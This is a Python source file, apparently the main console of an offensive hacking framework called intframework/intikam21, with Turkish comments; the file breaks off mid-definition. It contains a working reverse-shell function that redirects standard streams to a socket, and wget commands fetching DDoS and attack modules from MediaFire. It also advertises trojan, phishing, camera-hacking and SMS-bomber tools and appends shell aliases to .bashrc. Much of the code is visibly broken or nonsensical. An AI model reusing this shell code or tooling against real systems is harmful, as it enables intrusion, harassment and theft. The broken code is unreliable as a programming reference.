#!/usr/bin/env python3
# -*- coding: utf-8 -*-
global phisherserror
global clouderror
import os
try:
	os.system("$INTFRAMEWORK_PATH") or os.system("echo $INTFRAMEWORK_PATH")
except:
	os.system("export INTFRAMEWORK_PATH=$PREFIX/opt/intframework") or os.system("export INTFRAMEWORK_PATH=usr/opt/intframework")
cto = 0
try:
	if cto != 0:
		pass
	else:
		os.system("echo 'export intmodules_path=$INTFRAMEWORK_PATH/modules' >> ~/.bashrc; echo 'export intmodules_path=$INTFRAMEWORK_PATH/modules' >> ~/.zshrc")
		cto += 1
except:
	pass
from pyfiglet import Figlet
from colorama import Fore, init, Style
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import sys
import platform
import getpass
import subprocess
import socket
import psutil
from netaddr import IPNetwork, IPAddress
import argparse
import socket
import re
import threading
import time
import sys
import random
import urllib.request
from queue import Queue
import sqlite3
import json
import requests
import subprocess
import os
import pathlib
import subprocess
import colorama
from colorama import Fore, Back, Style
from modules.commands.banner import *
from modules.commands.dns_lookup import *

try:
	from modules import evasionint
except:
	pass
try:
	from modules import usersearcher
except:
	pass
try:
	from modules.usersearcher import searchus, banner, outer_func
except:
	pass
try:
	from modules.exploit_searcher import search_exploits, download_exploit
except:
	pass
try:
	from modules import exploit_searcher
except:
	pass
try:
	from modules import expdatabase
except:
	pass
try:
	from modules.expdatabase import create_option, create_exploit, show_options, set_option, run_exploit, use_framework, import_framework, initialize_framework
	from modules.expdatabase import import_framework, show_options, set_option, run_exploit, use_framework, create_exploit
except:
	print("exploit database not found please reinstall framework")
	pass
try:
	from modules import intmodules
except:
	pass
try:
	import intattack
except:
	pass
try:
	from modules.intattack import *
except Exception as e:
	print("[01.intbase] modules.intattack Not founded please reinstall framework")
	pass
try:
	import handlerunner
except Exception as e:
	print("[02.intbase] modules.exploit Not founded please reinstall framework")
	pass
try:
	from modules.exploits import *
except Exception as e:
	print("[03.intbase] modules.exploit Not founded please reinstall framework")
	pass
try:
	from modules.scanners import Bluetooth_scanner, adminfinder, dirscanner, dns_scanner, emailscan, networkscan, ping_scan, portscan, service_scanner, userscan, vulnerability_scanner, wlanscanner
except Exception as e:
	print("[04.intbase] modules.scanners Not founded please reinstall framework")
	pass
try:
	from modules.scanners.Crack import *
except Exception as e:
	print("[05.intbase] modules.scanners.Crack Not founded please reinstall framework")
	pass
try:
	from modules import login
except Exception as e:
	pass
try:
	from cloud import intcloud
	clouderror = False
except Exception as e:
	clouderror = True
	pass
try:
	from PHİSHERS import *
	phisherserror = False
except Exception as e:
	phisherserror = True
	pass
try:
	from modules import *
except Exception as e:
	pass
try:
	from modules import network_scan
except Exception as e:
	try:
		import network_scan
	except Exception as e:
		pass
	pass
try:
	from network_scan import *
except:
	pass
	
try:
	from exploiter import *
except:
	pass
try:
	from uuid_changer import *
except:
	pass
def manager():
	import plugin_manager as PluginManager
	manager = PluginManager.PluginManager(plugin_dir="plugins", event_manager=event_manager)



init(autoreset=True)
import plugin_manager as PluginManager
pg_manager = PluginManager.PluginManager(plugin_dir="plugins")

import os
from colorama import Fore

def pro_plugin():
	try:
		with open("pro.int4", "r+") as pg_pro:
			check_pro = pg_pro.read()
			if "pro_plugin" in check_pro:
				print(f"{Fore.GREEN}[+] Pro plugins are already installed.")
			else:
				print("Installing pro plugins...")
				# Download and move the first plugin
				os.system("wget -O modules/attackers/saddos.py 'https://www.mediafire.com/file/3j3cfk9fnwyhvnd/saddos.py/file?dkey=mvcx5j2ljzi&r=1279'")
				
				# Download and move the second plugin
				os.system("wget -O modules/attackers/intattack.py 'https://download1326.mediafire.com/4f1pgnduz33gbdUNEB0Rx1T0LbSJcSXzrf2pZHJseaL9bd4PRqFN2d4-3qo_kbcHNK_FhoFm17Y5hJq1L29hZHPdMH6r9mb3KBqeG-pLkcdLy39rx2i5Hu0cnzVYKlO_6SNfNiA2FWeVPCx6TqaDKu6sM_yl1-YC4XtwFrFxUUlqduU/qeawqkw70hn6s6b/intattack.py'")
				
				# Write "pro_plugin" flag to file
				pg_pro.write("pro_plugin")
				print(f"{Fore.GREEN}[+] Pro plugins installed successfully. Please restart the framework.")
	except FileNotFoundError:
		print("File pro.int4 not found. Ensure it exists and try again.")

import os
import sqlite3

class NmapDatabase:
    def __init__(self, db_name='nmap_results.db'):
        self.db_name = db_name
        self.conn = sqlite3.connect(self.db_name)
        self.create_table()

    def create_table(self):
        """Veritabanında bir tablo oluşturur."""
        with self.conn:
            self.conn.execute('''
                CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY,
                    target TEXT NOT NULL,
                    port INTEGER NOT NULL,
                    protocol TEXT NOT NULL,
                    state TEXT NOT NULL,
                    service TEXT
                )
            ''')

    def insert_scan_result(self, target, port, protocol, state, service):
        """Tarama sonuçlarını veritabanına ekler."""
        with self.conn:
            self.conn.execute('''
                INSERT INTO scans (target, port, protocol, state, service)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, port, protocol, state, service))

    def list_scan_results(self):
        """Veritabanındaki tarama sonuçlarını listeler."""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM scans')
        rows = cursor.fetchall()
        for row in rows:
            print(row)

    def clear_database(self):
        """Veritabanını temizler."""
        with self.conn:
            self.conn.execute('DROP TABLE IF EXISTS scans')
            self.create_table()  # Yeniden tablo oluştur

    def close(self):
        """Veritabanı bağlantısını kapatır."""
        self.conn.close()

class NmapScanner:
    def __init__(self):
        self.db = NmapDatabase()

    def run_command(self, command):
        """Kullanıcıdan alınan Nmap komutunu çalıştırır."""
        try:
            print(f"Executing command: {command}")
            result = os.popen(command).read()
            print(result)
            self.save_results_to_db(result, command)
        except Exception as e:
            print(f"An error occurred: {e}")

    def save_results_to_db(self, result, command):
        """Tarama sonuçlarını veritabanına kaydeder."""
        target = command.split()[-1]  # Hedef IP veya hostname'i al
        try:
            for line in result.splitlines():
                if "/tcp" in line:  # TCP portları içeren satırları kontrol et
                    parts = line.split()
                    port_info = parts[0].split('/')  # Port bilgilerini ayır
                    port = int(port_info[0])  # Port numarasını al
                    protocol = port_info[1]  # Protokolü al
                    state = parts[-1]  # Durumu al
                    service = parts[1] if len(parts) > 1 else None  # Servis adını al
                    self.db.insert_scan_result(target, port, protocol, state, service)
            print(f"Scan results for {target} saved to database.")
        except Exception as e:
            print(f"An error occurred while saving results to DB: {e}")

def data():
	global LHOSTS
	global LPORTS
	global RHOSTS
	global RPORTS
def False_adresses():
	adr = "$INTFRAMEWORK_PATH"
	random = ["a", "b", "c", "d", "e", "f", "g", "ğ", "h", "ı", "i", "j", "k", "l", "m", "n", "o", "ö", "p", "r", "s", "ş", "t", "u", "ü", "v", "y","x", "z"]
	selecter_num = random.randint(1, 20)
	selecter = random.select(random, selecter_num)
	user = help_input
	special_characters = ["@", "#", "$", "&", "%"  "~"]
	if user in random and special_characters:
		if user in random and special_characters and selecter_num:
			random_super = user
		else:
			random_super = user
	pool = ["{adr}/multi/handler/", "{adr}/modules/enum_{random_super}"]
	return pool
def check_network():
    try:
        # Attempt to connect to Google's DNS server
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False
        print("You are int-py mode")
# intconsole komutu
    # ASCII sanatı
	
ascii_sanat = """⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
. ⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿ """	
print(ascii_sanat)
    # 5 saniye boyunca animasyonu çalıştır
os.system("python3 startoolkit.py")
time.sleep(4)   

init()      
global jobs
# Initialize jobs dictionary
jobs = {}

# Function to add a job
def add_job(job_name, exploit=None):
    job_id = len(jobs) + 1
    jobs[job_id] = {'name': job_name, 'exploit': exploit}

# Function to list jobs
def list_jobs():
    for job_id, job_info in jobs.items():
        job_name = job_info['name']
        exploit = job_info['exploit']
        print(f"[{job_id}] {job_name}: executed")
        print("EXPLOITS")
        print("==========")
        print(f"    {job_id} {exploit if exploit else 'None'}")
        

# Job silme fonksiyonu
def kill_job(job_id):
    if job_id in jobs:
        print(f"Job [{job_id}] ({jobs[job_id]}) stopped and removed.")
        del jobs[job_id]
    else:
        print(f"No job found with ID: {job_id}")

# Global dictionary to store the options
options = {
    'LHOST': '0.0.0.0',
    'LPORT': '4444',
    'RHOST': '127.0.0.1',  # Default RHOST
    'RPORT': '80',  # Default RPORT
    'PAYLOAD': 'intframework/payloads/reverse_shell.py'
}

def set_option(option, value):
    """Set a specific option if it exists and update the options dictionary."""
    if option in options:
        options[option] = value
        print(f"[+] {option} set to {value}")
    else:
        print(f"[-] Invalid option: {option}")

def show_options(required_options, filename):
    """Show only the required options for the given script and execute external script."""
    import subprocess
    # Komutu çalıştır
    global modules
    try:
    	response = subprocess.check_output(f"python3 {modules} --opts", shell=True, stderr=subprocess.STDOUT)
    	# Eğer komut bir çıktı üretirse, response içeriğini kontrol edebilirsin
    	print(response.decode())  # Çıktıyı yazdır
    except subprocess.CalledProcessError as e:
    	# Eğer komut çalışmazsa, hatayı yakala ve belirtilen mesajı yazdır
    	print("""
    NAME                     Current Setting                Required    Description
    ------------------       ------------------------     ----------   ---------------------
    """)
    
def exit():
	os.system("exit")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
os.system("clear")
if check_network():
	print("you are inthacker-mode")
	add_job("network")
else:
	print("you are handler mode")
def bind_tcp(lhosts, lports):
	try:
		s.bind(lhosts, lports)
		conn, addr = s.accept()
		print("tcp addr is accepted ")
	except:
		print("tcp addr is not value or not accepted")
def reverse_tcp(rhosts, rports, addr):
    try:        
        # Connect to the remote host and port
        s.connect((rhosts, rports))
        
        # Redirect standard input/output/error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call([addr, '-i'])
    except Exception as e:
        print(f"Error: {e}")
        s.close()
def payloads():
    global meterpreter
    global payloads
    global payload_name
    global platform_g
    
    platform_g = platform.system()
    payload_name = ["/intchat/spesific", "/intframework/effuse/1", "/intframework/effuse/2", "/intframework/effuse/3", "/intframework/effuse/4", "/intframework/effuse/5", "/intframework/effuse/6", "/intframework/effuse/7", "/intframework/web/1", "/intframework/web/2", "/intframework/web/3", "/intframework/web/4", "/intframework/web/5", "/intframework/introjan/1", "/intframework/introjan/2", "/intframework/cam/1"]
    
    meterpreter = []
    for pn in payload_name:
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/bind_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_bind_tcp")

def search_payloads(term):
    global meterpreter
    return [payload for payload in meterpreter if term in payload]
def strips(help_input, name):
    return help_input.split("=", 1)[1].strip() if "=" in help_input else help_input[help_input.find(f"set {name} ") + len(f"set {name} "):].strip() if help_input.find(f"set {name} ") != -1 else help_input.strip()
def print_payloads(payload_list):
    for payload in payload_list:
        platform_part = payload.split('/')[1]
        path_part = '/'.join(payload.split('/')[2:])
        path_part_colored = path_part.replace('effuse', f"{Fore.BLUE}effuse{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('web', f"{Fore.BLUE}web{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('introjan', f"{Fore.BLUE}introjan{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('cam', f"{Fore.BLUE}cam{Style.RESET_ALL}")
        platform_colored = f"{Fore.RED}{platform_part}{Style.RESET_ALL}"
        meterpreter_colored = payload.split('/')[-1].replace('meterpreter', f"{Fore.RED}meterpreter{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('reverse_tcp', f"{Style.BRIGHT}reverse_tcp{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('bind_tcp', f"{Style.BRIGHT}bind_tcp{Style.RESET_ALL}")
        final_payload = f"/{platform_colored}/{path_part_colored}"
        print(final_payload.replace(payload.split('/')[-1], meterpreter_colored))
def used(used):
	if used == "used":
		pass
	else:
		print('you are not used')
def reverse_used(used, helper):
	if used == "used":
		print(f"[{Fore.RED}intbase{Fore.RESET}] you are used the tool", f"""
		example usage:
			{helper}
		""")
	else:
		pass
def dev_tools(dir, tool, norm):
	os.system(f"cd {dir}")
	if tool.lower() == "imei":
		os.system("""echo "imei='python /data/data/com.termux/files/home/intframework/imei.py' >> $INTFRAMEWORK_PATH/.bashrc """)
		used = "used"
		used(used)
	if tool.lower() == "sms" or "smsbomber" or "smsbomb":
		os.system("""echo "alias sms='python /data/data/com.termux/files/home/intframework/sms.py' >> $INTFRAMEWORK_PATH/.bashrc """)
	if tool.lower() == "connectbot":
		os.system("""echo "alias connectbot='python /data/data/com.termux/files/home/intframework/connectbot.py' >> $INTFRAMEWORK_PATH/.bashrc """)
	used_dev_tools = "used"
	os.system("source ~/.bashrc")
	used(used_dev-tools)
def launch_normaltools():
	pass
def search_evasions():
	os.system("python3 evasionint.py -s")
def listen_p(ip, port):
    # Soket oluştur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen(5)  # 5'e kadar bekleme kuyruğu
    print(f"Listening on {ip}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"Received data: {data.decode('utf-8')}")
        
        client_socket.close()
        print(f"Connection from {addr} closed")

def login(username, password):
	login.register(username, password)
def bannerss(help_input):
	global bannerss	
	bannerss = help_input[12:] or help_input[15:]
	banner()
	banners += bannerss	
	
def inputrs(sk):
	if sk.lower("y" or "yes"):
		pass
	if sk.lower("n" or "no"):
		exit()
	else:
		exit()
def parse_input(input_str):
    parts = input_str.split(':')
    if len(parts) == 1:
        return parts[0].split()[0], None
    elif len(parts) == 2:
        if parts[1].isdigit():
            return parts[0].split()[0], int(parts[1])
        else:
            raise ValueError("Geçersiz giriş formatı. Port sayısı geçerli bir tamsayı olmalıdır.")
    else:
        raise ValueError("Geçersiz giriş formatı. IP adresi/domain ve opsiyonel olarak port giriniz.")
def db_connect():
    # Veritabanına bağlan (örneğin, SQLite kullanıyorsanız)
    connection = sqlite3.connect('database.db')
    cursor = connection.cursor()
    return connection, cursor

def db_list(connection=sqlite3.connect('database.db'), cursor="connection.cursor()"):
    # Komutları listeleyin (örneğin, veritabanındaki tabloları listeleme)
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    for table in tables:
        print(f"Tablo adı: {table[0]}")

def db_disconnect(connection=sqlite3.connect('database.db')):
    # Bağlantıyı kapat
    connection.close()

def search(modules, query):
    results = {}
    query = query.lower()  # Convert query to lowercase for case-insensitive search
    
    for modul, description in modules.items():
        if query in modul.lower():  # Check if query matches module name
            results[modul] = description
    
    return results

# Example modules dictionary:
modulestr = {
    "introjan": "the best trojan horse tool",
    "oip": "the #3 information Gathering Tools",
    "intshark": "If you can't find anything, type intshark and find additional tools that we don't make or don't recognize.",
    "use": "use modules",
    "mode-admin": "use admin mode",
    "set": "set command, add and adjust settings",
    "bset": "bset sets a adjuet settings",
    "star": "chmodding tools",
    "search": "search tools",
    "item": "Call it with the item command without using callers like Python",
    "show": "show tools or exploits",
    "back": "back to term",
    "jobs": "see a jobs",
    "connect": "listen ip",
    "intweb": "Web hacking Tool",
    "intcam": "Cam Hack For intikam21 users",
    "intmeterpreter": "payload using and creating"
}
payloads = None
prompt = None
def get_meterpreter():
    global payloads
    try:
        result = subprocess.run(["python3", "intmeterpreter.py", "-pe"], check=True, capture_output=True, text=True)
        payloads = result.stdout.strip()  # Ensure payloads are stripped of any extra whitespace
    except subprocess.CalledProcessError as e:
        pass



def check_ip(ip):
    # Check if the IP address is valid
    try:
        socket.inet_aton(ip)
        print(f"{ip} is a valid IP address.")
    except socket.error:
        print(f"{ip} is not a valid IP address.")
        return
    
    # Try to connect to the IP address
    try:
        response = requests.get(f"http://{ip}")
        if response.status_code == 200:
            print(f"Successfully connected to {ip}.")
        else:
            print(f"Failed to connect to {ip}, status code: {response.status_code}")
    except requests.ConnectionError:
        print(f"Failed to connect to {ip}.")

def exploits(exp_name, output=None):
    os.system(f"python3 exploit_searcher.py keyword {exp_name} {'-o ' + output if output else ''}")
def listen(ip):
    HOST = ip 
    PORT = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind((HOST, PORT))
        s.listen(1)
        print('Socket bind complete')
        conn, addr = s.accept()
        print('Connected with ' + addr[0] + ':' + str(addr[1]))
        add_job(f"Listening {host}")
    except socket.error as msg:
        print('Bind failed. Error Code : ' + str(msg.errno) + ' Message ' + msg.strerror)
        pass
def user_count(help_input, repeat_count=2):
	inputs = []
	targets = ["set rhosts", "set rports", "set lports", "set lports", "set rhost", "set rport"]
	inputs.append(help_input)
	if help_input.lower() in targets and inputs.count(help_input) == repeat_count:
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del rhosts") or ("del rhost")  """)
		if targets == "set rport" or "set rports":
			print("""you are used rhosts you are must use ("del rports") or ("del rport")  """)
		if targets == "set lhost" or "set lhosts":
			print("""you are used rhosts you are must use ("del lhosts") or ("del lhost")  """)
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del lports") or ("del lport")  """)
import pywifi
from pywifi import *
from pywifi import PyWiFi, const, Profile
try:
	from scapy.all import sniff, Dot11, Dot11Beacon
except:
	pass
def is_root():
	return os.getuid() == 0
def scan_wifispy():
	if not is_root():
	   wifi = PyWiFi()
	   iface = wifi.interfaces()[0]  # Kullanmak istediğiniz WiFi arayüzünü seçin.
	   iface.scan()
	   iface.scan_results()
	   results = iface.scan_results()
	   for network in results:
	   	print(f"SSID: {network.ssid}, BSSID: {network.bssid}, Signal Level: {network.signal}")
	else:
		print("wifi not found")
		pass
	if is_root():
	       if packet.haslayer(Dot11Beacon):
	       	ssid = packet[Dot11].info.decode()
	       	bssid = packet[Dot11].addr3
	       	level = packet.dBm_AntSignal
	       	print(f"SSID: {ssid}, BSSID: {bssid}, Signal Level: {level}")
	else:
		print("wifi not found")
		pass

from colorama import Fore, Style, init			
init()
def scan5115(interface):
    from wifi import Cell, Scheme
    import scapy.all as scapy
    try:
    	networks = Cell.all(interface)
    except FileNotFoundError:
    	print("iwlist not found")
    if os.getuid() == 0:
    	print("[intbase] device is not rooted!")
    	
    print(f"{len(networks)} adet kablosuz ağ bulundu:")
    for network in networks:
        print(f"SSID: {network.ssid}")
        print(f"BSSID (MAC): {network.address}")
        print(f"Sinyal Gücü: {network.signal} dBm")
        print(f"Şifreleme: {network.encryption_type}\n")
def use_module(command):
    global modules, modulename
    try:
        # Komutun doğru formatta olup olmadığını kontrol et
        if command.startswith("use intframework/") or command.startswith("use "):
            # `use ` kısmını çıkar ve modül yolunu al
            module_path = command.split(" ", 1)[1].replace("::", "/")
            modulename = os.path.basename(module_path)  # Dosya adını al
            modules = module_path  # Global değişken olarak belirle

            # Modül bilgilerini kullanıcıya göster
            get_input(modules=module_path, modulename=modulename)
            print(f"\n{Fore.YELLOW}[*] Loading module: {Fore.CYAN}{module_path}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Module: {Fore.GREEN}{modulename}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Successfully loaded.{Style.RESET_ALL}\n")
        else:
            print(f"\n{Fore.RED}[-] Invalid command.{Style.RESET_ALL} Use '{Fore.CYAN}use intframework/path/to/module_name{Style.RESET_ALL}' or '{Fore.CYAN}use path/to/module_name{Style.RESET_ALL}'.\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}\n")

def check_if_argparse_used(module_path):
    """Argparse kullanımı kontrol eder"""
    try:
        with open(module_path, "r") as f:
            content = f.read()
            if 'argparse' in content:
                return True
        return False
    except Exception as e:
        print(f"Error reading the module file: {e}")
        return False
# Directories to search
dirs_int = ["intPRO", "modules", "PHİSHERS", "tools"]

def list_all_files(directories):
    """
    List all files in the specified directories
    - directories: Directories to search in.
    """
    file_paths = []
    
    # Traverse each directory and its subdirectories
    for directory in directories:
        base_path = pathlib.Path(directory)
        
        if not base_path.exists():
            print(Fore.RED + f"[!] Directory not found: {directory}")
            continue
        
        for file in base_path.rglob('*'):  # Use rglob to search all files
            if file.is_file():  # Only add files
                file_paths.append(file)
                
    return file_paths

def search_in_file(file_path, search_term):
    """
    Search for a term in a file and return the matching lines
    - file_path: The file to search in.
    - search_term: The term to search for.
    """
    matching_lines = []
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                if search_term.lower() in line.lower():  # Case-insensitive search
                    matching_lines.append(line.strip())
    except Exception as e:
        print(Fore.RED + f"[!] Error: Could not read the file {file_path}: {e}")
    
    return matching_lines

def display_files(file_paths):
    """
    Display the list of files found
    """
    if file_paths:
        print(Fore.GREEN + Style.BRIGHT + "[*] All Files:")
        for file in file_paths:
            print(Fore.CYAN + f"  [+] {str(file)}")
    else:
        print(Fore.RED + "[!] No files found.")

def search(files, term):
    """
    Search for a term in all files
    - files: List of files to search in.
    - term: The term to search for.
    """
    search_results = {}
    
    for file in files:
        matching_lines = search_in_file(file, term)
        if matching_lines:
            search_results[file] = matching_lines
    
    return search_results

def display_search_results(results):
    """
    Display the search results
    """
    if results:
        print(Fore.GREEN + Style.BRIGHT + "\n[*] Search Results:")
        for file, lines in results.items():
            print(Fore.YELLOW + f"\n[+] {file}:")
            for line in lines:
                print(Fore.CYAN + f"    [*] {line}")
    else:
        print(Fore.RED + "[!] No matches found.")

def us_search(search_term):
    """
    Perform a search using the given search term in the specified directories.
    - search_term: The term to search for.
    """
    # List all files in the directories
    file_paths = list_all_files(dirs_int)

    # Perform the search
    results = search(file_paths, search_term)

    # Display the search results
    display_search_results(results)

def detect_interpreter(module_path):
    """
    Detect the appropriate interpreter for a given file based on its extension, 
    shebang line, or defaults for Intikam21 Framework.
    """
    try:
        # 1. Dosya mevcut mu kontrol et
        if not os.path.isfile(module_path):
            print(f"{Fore.RED}[!] Module not found: {Fore.CYAN}{module_path}{Style.RESET_ALL}")
            return None  # Dosya yoksa None döndür

        # 2. Dosya uzantısını kontrol et
        extension = os.path.splitext(module_path)[1].lower()
        interpreter_by_extension = {
            ".py2": "python2",   # Özel Python 2 uzantısı
            ".py": "python3",    # Varsayılan olarak Python 3
            ".c": "gcc",
            ".cpp": "g++",
            ".cs": "csharp",
